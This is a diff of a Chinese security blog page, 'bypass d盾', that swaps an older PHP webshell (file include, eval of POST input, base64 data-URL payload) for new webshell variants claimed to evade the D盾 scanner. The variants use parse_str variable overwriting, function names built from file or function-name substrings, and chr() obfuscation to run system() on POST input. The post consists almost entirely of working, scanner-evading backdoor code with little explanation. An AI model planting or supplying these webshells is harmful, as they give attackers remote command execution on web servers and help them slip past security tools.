@@ -21,18 +21,20 @@
     var CONFIG = {"hostname":"lockcy.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="https:&#x2F;&#x2F;www.bacde.me&#x2F;post&#x2F;Webshellkill-Bypass-Php-Webshell&#x2F;">
+  <meta name="description" content="20220211 update20200103 update">
 <meta property="og:type" content="article">
 <meta property="og:title" content="bypass d盾">
 <meta property="og:url" content="https://lockcy.github.io/2020/01/03/bypass-d%E7%9B%BE/index.html">
 <meta property="og:site_name" content="lockcy&#39;s cave">
-<meta property="og:description" content="https:&#x2F;&#x2F;www.bacde.me&#x2F;post&#x2F;Webshellkill-Bypass-Php-Webshell&#x2F;">
+<meta property="og:description" content="20220211 update20200103 update">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://lockcy.github.io/2020/01/03/bypass-d%E7%9B%BE/1.png">
 <meta property="article:published_time" content="2020-01-03T03:20:20.000Z">
-<meta property="article:modified_time" content="2020-01-03T03:46:56.354Z">
+<meta property="article:modified_time" content="2022-02-11T11:51:25.488Z">
 <meta property="article:author" content="lockcy">
 <meta property="article:tag" content="web">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://lockcy.github.io/2020/01/03/bypass-d%E7%9B%BE/1.png">
 
 <link rel="canonical" href="https://lockcy.github.io/2020/01/03/bypass-d%E7%9B%BE/">
 
@@ -186,10 +188,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2020-01-03 11:20:20 / 修改时间：11:46:56" itemprop="dateCreated datePublished" datetime="2020-01-03T11:20:20+08:00">2020-01-03</time>
+              <time title="创建时间：2020-01-03 11:20:20" itemprop="dateCreated datePublished" datetime="2020-01-03T11:20:20+08:00">2020-01-03</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-02-11 19:51:25" itemprop="dateModified" datetime="2022-02-11T19:51:25+08:00">2022-02-11</time>
+              </span>
 
           
             <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
@@ -204,7 +212,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>522</span>
+              <span>919</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -223,13 +231,18 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p><a target="_blank" rel="noopener" href="https://www.bacde.me/post/Webshellkill-Bypass-Php-Webshell/">https://www.bacde.me/post/Webshellkill-Bypass-Php-Webshell/</a></p>
+        <p><strong>20220211 update</strong><br>20200103 update</p>
 <span id="more"></span>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function cc()&#123;</span><br><span class="line">    global $b;</span><br><span class="line">    $a &#x3D;$_GET[$b];  &#x2F;&#x2F;此处可改成POST方式</span><br><span class="line">    $str &#x3D;$a;</span><br><span class="line">    return $str;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">$b&#x3D;&quot;url&quot;;</span><br><span class="line">$c&#x3D;cc();</span><br><span class="line">$aa &#x3D; $c;</span><br><span class="line"></span><br><span class="line">include($aa);</span><br></pre></td></tr></table></figure>
-<p>任意文件包含（远程，本地）<br><a target="_blank" rel="noopener" href="http://localhost:8081/webshell/bypassdshell/1.php?url=123.txt">http://localhost:8081/webshell/bypassdshell/1.php?url=123.txt</a><br>任意代码执行（allow_url_include=On)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_POST[cmd]);?&gt;</span><br></pre></td></tr></table></figure>
-<p><a target="_blank" rel="noopener" href="http://10.10.10.3:8081/webshell/bypassdshell/1.php?url=data:image/png;base64,PD9waHAgZXZhbCgkX1BPU1RbY21kXSk7Pz4=">http://10.10.10.3:8081/webshell/bypassdshell/1.php?url=data:image/png;base64,PD9waHAgZXZhbCgkX1BPU1RbY21kXSk7Pz4=</a><br>菜刀连接</p>
-<p>d盾2020.1.3免杀</p>
+<p><del>~ d盾2020.1.3免杀 ~</del><br><del>~ <a target="_blank" rel="noopener" href="https://www.bacde.me/post/Webshellkill-Bypass-Php-Webshell/">https://www.bacde.me/post/Webshellkill-Bypass-Php-Webshell/</a> ~</del></p>
+<p>免杀（D盾2.1.6.2）<br>parse_str变量覆盖</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$b &#x3D; $_POST[&#39;cmd&#39;];</span><br><span class="line">parse_str(&quot;a&#x3D;$b&quot;);</span><br><span class="line">print_r(&#96;$a&#96;);</span><br></pre></td></tr></table></figure>
+<p>利用文件名构造函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">substr(__FILE__, -10, -4)($_POST[&#39;cmd&#39;]);</span><br></pre></td></tr></table></figure>
+<p>利用函数名构造函数</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function systema()</span><br><span class="line">&#123;</span><br><span class="line">    substr(__FUNCTION__, -7, -1)($_POST[&#39;cmd&#39;]);</span><br><span class="line">&#125;</span><br><span class="line">systema();</span><br></pre></td></tr></table></figure>
+<p>php7</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class User</span><br><span class="line">&#123;</span><br><span class="line">    public $name &#x3D; &#39;&#39;;</span><br><span class="line">    function setName($a)&#123;</span><br><span class="line">        $this-&gt;name &#x3D; $a;</span><br><span class="line">        &#x2F;&#x2F;((&quot;\x13&quot;^&quot;&#96;&quot;).(&quot;\x19&quot;^&quot;&#96;&quot;).(&quot;\x13&quot;^&quot;&#96;&quot;).(&quot;\x14&quot;^&quot;&#96;&quot;).(&quot;\x05&quot;^&quot;&#96;&quot;).(&quot;\x0d&quot;^&quot;&#96;&quot;))($this-&gt;name);</span><br><span class="line">        (chr(115).chr(121).chr(115).chr(116).chr(101).chr(109))($this-&gt;name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$user &#x3D; new User;</span><br><span class="line">$user-&gt;setName($_POST[&#39;cmd&#39;]);</span><br></pre></td></tr></table></figure>
+<img src="/2020/01/03/bypass-d%E7%9B%BE/1.png" class="">
 
     </div>
 
@@ -398,7 +411,7 @@
       <i class="fa fa-coffee"></i>
     </span>
       <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">2:13</span>
+    <span title="站点阅读时长">2:14</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
   </div>
